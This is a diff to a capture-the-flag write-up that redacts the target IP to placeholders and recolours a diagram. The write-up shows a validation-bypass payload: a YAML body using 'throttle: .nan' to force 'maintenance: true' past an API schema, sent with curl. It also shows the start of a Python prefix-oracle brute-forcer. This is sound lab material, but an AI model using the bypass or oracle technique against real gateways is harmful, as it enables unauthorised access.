@@ -21,7 +21,7 @@ The goal is to convince the gateway to accept `maintenance: true` anyway, open t
 | Item | Value |
 |------|-------|
 | Objective | Make the gateway accept `maintenance: true` and open the maintenance console |
-| Target | `nc 52.146.88.61 <port>` (a fresh port is assigned per session) |
+| Target | `nc <ip> <port>` (a fresh port is assigned per session) |
 | Contract | `GET /openapi.yaml` |
 
 The instance port changes every session, and — as it turns out — part of the secret is randomised per instance, so the exploit has to be run against the instance you were assigned.
@@ -31,7 +31,7 @@ The instance port changes every session, and — as it turns out — part of the
 ```mermaid
 flowchart TD
     %% ---------- Target ----------
-    A[("Target: Relay Control Gateway<br/>nc 52.146.88.61 PORT")]:::target
+    A[("Target: Relay Control Gateway<br/>nc &lt;ip&gt; &lt;port&gt;")]:::target
     B["GET /openapi.yaml<br/>read the published contract"]:::attacker
     C["Command schema: maintenance enum false<br/>throttle number 0..100<br/>additionalProperties false<br/>content-types: json + yaml"]:::target
     D["Recon: probe the schema edges<br/>duplicate keys, CT confusion, framing,<br/>path / header / query tricks, PUT 405"]:::recon
@@ -53,14 +53,14 @@ flowchart TD
     N1["Static 49-char prefix<br/>prg{n4n_sl1pp3d_p4st_th3_sp3c_[A-Za-z0-9]{8179465<br/>plus a random per-instance suffix<br/>recover on the assigned instance"]:::note -.-> J
 
     %% ---------- Roles ----------
-    classDef target fill:var(--panel),stroke:var(--accent-cyan),color:var(--text)
-    classDef attacker fill:var(--panel),stroke:var(--accent-pink),color:var(--text)
-    classDef recon fill:var(--panel),stroke:var(--muted),color:var(--text)
-    classDef vuln fill:var(--panel),stroke:var(--accent-orange),stroke-width:3px,color:var(--text)
-    classDef result fill:var(--panel),stroke:var(--accent-cyan),color:var(--text)
-    classDef decision fill:var(--panel),stroke:var(--accent-orange),color:var(--text)
-    classDef note fill:var(--panel),stroke:var(--muted),stroke-dasharray:4 2,color:var(--muted)
-    classDef flag fill:var(--panel),stroke:var(--accent-pink),stroke-width:3px,color:var(--text)
+    classDef target fill:#272044,stroke:#65e7e3,color:#fff7de
+    classDef attacker fill:#272044,stroke:#ff5e9d,color:#fff7de
+    classDef recon fill:#272044,stroke:#baaed6,color:#fff7de
+    classDef vuln fill:#272044,stroke:#ffb347,stroke-width:3px,color:#fff7de
+    classDef result fill:#272044,stroke:#65e7e3,color:#fff7de
+    classDef decision fill:#272044,stroke:#ffb347,color:#fff7de
+    classDef note fill:#272044,stroke:#baaed6,stroke-dasharray:4 2,color:#baaed6
+    classDef flag fill:#272044,stroke:#ff5e9d,stroke-width:3px,color:#fff7de
 ```
 
 The chain is linear: read the contract, find the fail-open path, then drive the console's prefix oracle one character at a time.
@@ -72,7 +72,7 @@ The chain is linear: read the contract, find the fail-open path, then drive the 
 The gateway serves its own contract, so the first step is simply fetching it:
 
 ```bash
-curl -sS http://52.146.88.61:<port>/openapi.yaml
+curl -sS "http://<ip>:<port>/openapi.yaml"
 ```
 
 The relevant parts:
@@ -169,7 +169,7 @@ Proof, in one command:
 
 ```bash
 BODY=$(printf "command: status\nthrottle: .nan\nmaintenance: true\n")
-curl -sS -X POST "http://52.146.88.61:<port>/v1/relays/aurora-1/command" \
+curl -sS -X POST "http://<ip>:<port>/v1/relays/aurora-1/command" \
   -H 'Content-Type: application/yaml' --data-binary "$BODY"
 ```
 
@@ -234,7 +234,7 @@ The recovery is a simple left-to-right search. Characters are tried with lowerca
 import http.client as hc, json, os, string, time
 from concurrent.futures import ThreadPoolExecutor
 
-HOST, PORT = "52.146.88.61", 38645
+HOST, PORT = "<ip>", int("<port>")
 KEYFILE = "key.txt"
 
 ALPHA = (list(string.ascii_lowercase) + list(string.digits)
